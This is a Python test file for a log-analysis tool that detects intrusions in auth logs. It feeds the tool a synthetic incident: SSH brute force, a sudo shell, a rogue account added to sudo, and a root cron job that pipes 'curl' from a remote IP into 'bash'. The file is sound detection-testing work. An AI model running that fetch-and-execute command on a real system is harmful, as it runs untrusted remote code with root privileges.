"""Engine tests: what the report claims, and whether the claim is honest."""

import datetime

from _util import (
    cron_command,
    group_membership,
    parse_log,
    ssh_accepted,
    ssh_failed,
    ssh_failed_from_ips,
    sudo_command,
    user_created,
)

from logtriage.engine import analyze
from logtriage.models import Finding, grade_for_score, score_from_findings
from logtriage.options import Options
from logtriage.rules import default_rules


def opts(**overrides) -> Options:
    base = Options(window=datetime.timedelta(minutes=10))
    for key, value in overrides.items():
        setattr(base, key, value)
    return base


FULL_INCIDENT = "\n".join(
    ssh_failed(6, ip="203.0.113.7", user="deploy")
    + [ssh_accepted(user="deploy", ip="203.0.113.7", offset=200)]
    + [sudo_command("deploy", "/bin/bash", offset=260)]
    + [user_created("mallory", offset=300)]
    + [group_membership("mallory", "sudo", offset=320)]
    + [cron_command("root", "curl -s http://198.51.100.9/x.sh | bash", offset=400)]
    # 18:00 plus nine hours: 03:00, which the context rule is meant to flag.
    + [ssh_accepted(user="deploy", ip="198.51.100.4", offset=32400)]
)


def test_full_incident_fires_the_expected_rules():
    report = analyze(parse_log(FULL_INCIDENT), default_rules(opts()), inputs=["auth.log"])
    fired = {f.rule for f in report.findings}
    assert "ssh-bruteforce-single-source" in fired
    assert "ssh-failed-then-accepted" in fired
    assert "sudo-shell-escape" in fired
    assert "account-created" in fired
    assert "privileged-group-change" in fired
    assert "suspicious-cron-command" in fired
    assert "off-hours-login" in fired


def test_report_counts_the_events_it_read():
    events = parse_log(FULL_INCIDENT)
    report = analyze(events, default_rules(opts()), inputs=["auth.log"])
    assert report.events == len(events)
    assert report.inputs == ["auth.log"]


def test_severe_findings_sort_first():
    report = analyze(parse_log(FULL_INCIDENT), default_rules(opts()))
    rank = {severity: index for index, severity in enumerate(
        ["critical", "high", "medium", "low", "info"])}
    ordered = [rank[f.severity] for f in report.findings]
    assert ordered == sorted(ordered)


def test_quiet_rules_are_still_reported_as_having_run():
    report = analyze(parse_log(FULL_INCIDENT), default_rules(opts()))
    coverage = {outcome.id: outcome for outcome in report.rules}
    assert len(coverage) == 16
    assert coverage["ssh-password-spray"].fired == 0
    assert coverage["ssh-user-enumeration"].evaluated == 0
    # The matched rules report how much evidence they looked at, not just a hit.
    assert coverage["ssh-bruteforce-single-source"].fired == 1


def test_clean_log_scores_one_hundred_and_grade_a():
    benign = ssh_accepted(user="deploy", ip="198.51.100.4", offset=0)
    report = analyze(parse_log(benign), default_rules(opts()))
    assert report.findings == []
    assert report.score == 100
    assert report.grade == "A"


def test_incident_lowers_the_score():
    report = analyze(parse_log(FULL_INCIDENT), default_rules(opts()))
    assert report.score < 40
    assert report.grade in ("D", "F")


def test_score_and_grade_boundaries():
    assert score_from_findings([]) == 100
    assert grade_for_score(100) == "A"
    assert grade_for_score(89) == "B"
    assert grade_for_score(79) == "C"
    assert grade_for_score(65) == "D"
    assert grade_for_score(59) == "F"
    heavy = [Finding(rule="r", title="t", severity="critical") for _ in range(5)]
    assert score_from_findings(heavy) == 0


def test_findings_are_capped_per_rule_and_the_cap_is_declared():
    lines = []
    for index in range(25):
        lines.extend(ssh_failed(5, ip="198.51.100.{}".format(index + 1), step=1,
                                start=index * 5))
    report = analyze(parse_log("\n".join(lines)), default_rules(opts()), max_per_rule=20)
    brute = [f for f in report.findings if f.rule == "ssh-bruteforce-single-source"]
    assert len(brute) == 20
    assert report.suppressed == 5


def test_max_per_rule_drops_the_rest_and_counts_them():
    lines = []
    for index in range(3):
        lines.extend(ssh_failed(5, ip="198.51.100.{}".format(index + 1), step=1,
                                start=index * 5))
    lines.extend(ssh_failed(5, ip="203.0.113.99", user="root", step=1, start=100))
    report = analyze(parse_log("\n".join(lines)), default_rules(opts()), max_per_rule=1)
    brute = [f for f in report.findings if f.rule == "ssh-bruteforce-single-source"]
    assert len(brute) == 1
    assert report.suppressed == 3


def test_above_filters_by_severity():
    report = analyze(parse_log(FULL_INCIDENT), default_rules(opts()))
    assert {f.severity for f in report.above("high")} <= {"critical", "high"}
    assert len(report.above("info")) >= len(report.above("high"))
    assert report.above("critical")
    assert all(f.severity != "info" for f in report.above("high"))


def test_report_serialises_to_plain_data():
    report = analyze(parse_log(FULL_INCIDENT), default_rules(opts()), inputs=["auth.log"])
    data = report.to_dict()
    assert data["tool"] == "logtriage"
    assert data["findings_count"] == len(report.findings)
    assert data["params"]["window"] == "10m"
    first = data["findings"][0]
    assert set(["rule", "severity", "source", "count", "total", "evidence",
                "mitre", "remediation"]) <= set(first)


def test_distributed_report_mentions_every_source_in_evidence():
    lines = ssh_failed_from_ips(5, user="deploy")
    report = analyze(parse_log("\n".join(lines)), default_rules(opts()))
    finding = [f for f in report.findings if f.rule == "ssh-distributed-bruteforce"][0]
    assert finding.count == 5
    assert len(finding.evidence) == 5


def test_thresholds_are_reported_so_a_reader_can_reproduce_the_run():
    tuning = opts(fail_threshold=3)
    report = analyze(parse_log(FULL_INCIDENT), default_rules(tuning), options=tuning)
    assert report.params["fail_threshold"] == 3
    assert report.params["off_hours"] == "22:00-06:00"
